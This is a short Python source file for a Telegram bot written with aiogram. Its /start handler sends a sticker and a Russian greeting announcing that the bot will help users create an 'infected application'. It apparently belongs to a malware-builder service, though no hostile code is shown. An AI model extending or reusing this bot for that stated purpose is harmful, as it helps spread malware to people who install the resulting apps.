from aiogram import types
from loader import dp

from keyboards.default import start_menu


@dp.message_handler(text='/start')
async def process_start_command(message: types.Message):
    await message.answer_sticker("CAACAgIAAxkBAAED61FiCYAG_XjG5H8nS1J41rokTyqq7gACQhAAAjPFKUmQDtQRpypKgiME")
    await message.answer(f"Добро пожаловать, {message.from_user.first_name}! 🔥\nЯ - многофункциональный телеграм бот, помогу тебе создать заражённое приложение. 👻", reply_markup=start_menu, parse_mode='html')
